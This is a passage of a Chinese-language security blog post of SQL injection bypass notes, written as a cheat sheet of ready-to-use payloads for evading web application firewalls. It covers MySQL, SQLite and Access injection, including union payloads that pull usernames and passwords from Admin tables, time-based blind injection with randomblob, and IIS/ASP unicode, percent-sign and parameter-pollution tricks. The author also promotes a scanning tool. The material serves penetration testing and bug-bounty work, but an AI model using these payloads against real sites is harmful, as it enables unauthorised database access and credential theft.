+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原：select column_name  from information_schema.tables where table_name=&quot;users&quot;</span><br><span class="line">后：select column_name  from information_schema.tables where table_name=0x7573657273</span><br></pre></td></tr></table></figure>
+
+<ol start="8">
+<li><strong>逗号绕过</strong></li>
+</ol>
+<ul>
+<li>使用from关键字绕过<br>在substr()和mid()这两个函数中可以使用from to绕过对逗号的过滤：</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原：<span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br><span class="line">后：<span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用join关键字绕过</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原：<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line">后：<span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用like关键字绕过</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原：select ascii(mid(user(),1,1))=80   #等价于</span><br><span class="line">后：select user() like &#x27;r%&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用offset关键字绕过<br>对于limit可以使用offset绕过</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原：<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">后：<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<h2><span id="sqlite">SQLite</span></h2><ol>
+<li><strong>函数特性绕过</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># SQLite无concat()，用||连接字符串</span><br><span class="line">原：concat(&#x27;user=&#x27;,user())</span><br><span class="line">后：&#x27;user=&#x27;||user()</span><br><span class="line"></span><br><span class="line"># 无ascii()，用unicode()替代</span><br><span class="line">原：ascii(substr(user(),1,1))</span><br><span class="line">后：unicode(substr(sqlite_version(),1,1))</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><strong>关键字绕过</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># select被拦截时</span><br><span class="line">原：select name from sqlite_master</span><br><span class="line">后：SELect name from sqlite_master （大小写混合）</span><br><span class="line">    select/**/name from sqlite_master （注释插空格）</span><br><span class="line">    [select] name from sqlite_master （方括号包裹，部分版本支持）</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><strong>运算绕过（SQLite支持数学函数）</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 当+被拦截时，用add()函数</span><br><span class="line">原：id=1+1</span><br><span class="line">后：id=add(1,1)</span><br><span class="line"></span><br><span class="line"># 乘法*被拦截时，用mul()</span><br><span class="line">原：id=2*3</span><br><span class="line">后：id=mul(2,3)</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><strong>时间盲注</strong><br>好像没什么大师傅知道SQLite能时间盲注的？<br>既然Edusrc允许时间盲注证明而且函数比较特殊，那就当绕过方式提一下</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">randomblob(N) # 返回一个N字节长的包含伪随机字节的BLOG，可以用它制造延时</span><br></pre></td></tr></table></figure>
+
+<h2><span id="access">Access</span></h2><p>这个数据库的绕过方式比较少，但因为函数名称特殊，依赖于正则规则的WAF通常不拦截它们。<br>分为一种无select注入与两种select注入形式</p>
+<ol>
+<li><strong>无select注入</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-asc(mid((dfirst(&quot;[username]&quot;,&quot;[Admin]&quot;)),6,1))</span><br><span class="line">-asc(mid((dlast(&quot;[password]&quot;,&quot;[User]&quot;)),1,1)) （dlast与dfirst类似）</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><strong>联合注入</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 联合查询基础格式</span><br><span class="line">union select 1,username,password,4 from Admin-- </span><br><span class="line"># 字段数判断（用null填充）</span><br><span class="line">union select null,null,null from Admin-- </span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><strong>exists</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exists(select admin from admin)</span><br></pre></td></tr></table></figure>
+
+<h2><span id="特定环境绕过">特定环境绕过</span></h2><ol>
+<li><strong>IIS服务器支持对于unicode的解析</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原：id=1000-asc(1)</span><br><span class="line">后：id=1000-a%u0073c(1) # s的unicode编码为\u0073（需要将\换为%后传入服务器解析）</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><strong>ASP+IIS环境特性</strong></li>
+</ol>
+<ul>
+<li>特性1（<em>特殊符号%的处理</em>）</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原：id=1000-asc(1)</span><br><span class="line">后：id=1000-a%sc(1)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>特性2（<em>注释绕过</em>）</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原：id=1000</span><br><span class="line">后：a=/*&amp;id=1000-asc(1)&amp;b=*/ （服务器拼接参数后形成/*1000-asc(1)*/）</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><strong>Nginx+PHP环境特性</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 当空格被拦截时，用%09（制表符）替代</span><br><span class="line">原：id=1 and 1=1</span><br><span class="line">后：id=1%09and%091=1</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><strong>URL编码绕过（部分服务器会二次解码）</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 双重URL编码</span><br><span class="line">原：id=1 and 1=1</span><br><span class="line">第一次编码：id=1%20and%201=1</span><br><span class="line">第二次编码：id=1%2520and%25201%253D1</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li><strong>HTTP参数污染（部分服务器会拼接参数值）</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原：id=1000 and 1=1</span><br><span class="line">后：id=1000&amp;id=and&amp;id=1=1</span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li><strong>使用双关键字绕过（若删除掉第一个匹配的union就能绕过）</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; UNION SELECT 1,2,3</span><br><span class="line">id=-1&#x27; UNIunionON SeLselectECT 1,2,3</span><br></pre></td></tr></table></figure>
+
+<p>写在最后，SQL注入绕过其实并不难，我也是凭借SQL注入在一周时间里水了100多Rank</p>
+<img src="/2025/08/01/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/1.png" class title="文章配图">
+
+<p>最后，希望各位大师傅多多推下我的项目吖~<br><strong><a target="_blank" rel="noopener" href="https://github.com/JiuZero/z0scan">Z0Scan</a></strong>: Security tools for web vulnerability detection and red teaming.</p>
+<img src="/2025/08/01/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/logo.png" class title="Z0Scan项目Logo">
+    </div>
+    <footer class="article-footer">
+      
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/en/tags/sqli/" rel="tag" title="sqli">sqli</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/en/tags/%E7%AC%94%E8%AE%B0/" rel="tag" title="笔记">笔记</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+          <img data-src="https://img.8845.top/img2/126185064.jpg" data-sizes="auto" alt="Z0Scan - 开发指南" class="lazyload">
+        <a href="/en/2025/11/09/z0scan-%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/" aria-label="Prev: Z0Scan - 开发指南" title="Prev: Z0Scan - 开发指南"></a>
+        <div class="article-nav-caption">Prev</div>
+        <h3 class="article-nav-title">
+            Z0Scan - 开发指南
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+        <img data-src="https://img.8845.top/img2/G5ZJOsgb0AEGSHm.jpg" data-sizes="auto" alt="Z0Scan - 使用指南" class="lazyload">
+      <a href="/en/2025/06/13/z0scan-%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/" aria-label="Next: Z0Scan - 使用指南"  title="Next: Z0Scan - 使用指南"></a>
+      <div class="article-nav-caption">Next</div>
+      <h3 class="article-nav-title">
+          Z0Scan - 使用指南
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2026
+        <span class="footer-info-sep "></span>
+      JiuZero
+    </div>
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        10.5k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        00:50
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">通用绕过方法：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">MySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">SQLite</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">特定环境绕过</span></a></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="JiuZero" class="lazyload">
+  <div class="sidebar-author-name">JiuZero</div>
+  <div class="sidebar-description">东风夜放花千树，更吹落、星如雨。</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-email sidebar-social-icon">
+      <a href=mailto:1703417187@qq.com itemprop="url" target="_blank" aria-label="email" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/JiuZero itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/1308423507 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-qq sidebar-social-icon">
+      <a href=https://qm.qq.com/q/RIxC8AQxCE itemprop="url" target="_blank" aria-label="qq" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/" aria-label="Home"></a>
+          <div class="sidebar-menu-icon icon ">
+                &#xf015;
+          </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/archives" aria-label="Archives"></a>
+          <div class="sidebar-menu-icon icon ">
+                &#xf187;
+          </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/about" aria-label="About"></a>
+          <div class="sidebar-menu-icon icon ">
+                &#xf007;
+          </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/friend" aria-label="Friend"></a>
+          <div class="sidebar-menu-icon icon ">
+                &#xf500;
+          </div>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png" loading="lazy" decoding="async" fetchpriority="low"/>
+        </div>
+      </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+  
+<script src="https://npm.webcache.cn/material-theme@1.0.0/dist/material-theme.umd.js" integrity="sha384-vLev0II0HKFaxkcm+&#x2F;7kX5IGwVFBASkGchU311wmU&#x2F;veIj2bB0UcBkQbW6yw2asK" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+  
+<script src="/js/generator_search.js" defer></script>
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/quicklink@3.0.1/dist/quicklink.umd.js" integrity="sha384-caMDqvgav&#x2F;HWdEYQU1QRRHMLleigpL1YHAG0m371DhzfL8rRzUyOb+bEHtwlmYjD" crossorigin="anonymous"></script>
+
+  <script data-pjax>
+    window.quicklink?.listen({
+      timeout: 3000,
+      priority: true,
+      ignores: []
+    });
+  </script>
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "JiuZero",
+          title: "SQL注入绕过笔记",
+          url: "https://jiuzero.github.io/2025/08/01/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/",
+          excerpt: " 最后一次更新：2025.8.1 ",
+          description: "",
+          stripContent: " 最后一次更新：2025.8.1       基础 通用绕过方法： MySQL SQLite Access 特定环境绕过    基础 逻辑符  123and （&amp;amp;&amp;amp;）or（||）xor（^） # 有些数据库不支持异或运算  除外还有一些在实战过程中不常用的： 1234not（!）~ # 位取反&amp;lt;&amp;lt; # 位左移&amp;gt;&amp;gt; # 位右移   运算符（加减乘除）  不要小看运算符，它能帮助你快速验证SQL注入是否存在假设有参数id&amp;#x3D;1id&amp;#x3D;2-1（T",
+          date: "Fri Aug 01 2025 00:00:00 GMT+0800",
+          updated: "Sat Jul 04 2026 00:24:43 GMT+0800",
+          cover: "https://img.8845.top/img2/133074326_p0.jpg",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.5' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+<script data-pjax>
+  var updateTime = _$('#post-update-time')?.innerHTML;
+
+  if (updateTime) {
+    const update = new Date(updateTime);
+    const now = new Date();
+    const diff = now - update;
+    const days = diff / 86400000;
+    const { daysAgo, message: template } = window.REIMU_CONFIG.outdate;
+    if (days >= daysAgo) {
+      let message = `This article was last updated on ${updateTime}. Please note that the content may no longer be applicable.`;
+      if (typeof template === 'string') {
+        message = template.replace(/{time}/, updateTime);
+      } else if (typeof template === 'object') {
+        const lang = document.documentElement.lang;
+        const messageKey = Object.keys(template).find(key => key.toLowerCase() === lang.toLowerCase());
+        if (messageKey && template[messageKey]) {
+          message = template[messageKey].replace(/{time}/, updateTime);
+        }
+      }
+      const blockquote = _$('#outdate-blockquote');
+      if (blockquote) {
+        blockquote.querySelectorAll('p')[1].innerText = message;
+        blockquote.style.display = 'flow-root';
+      }
+    }
+  }
+</script>
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
+  </html>
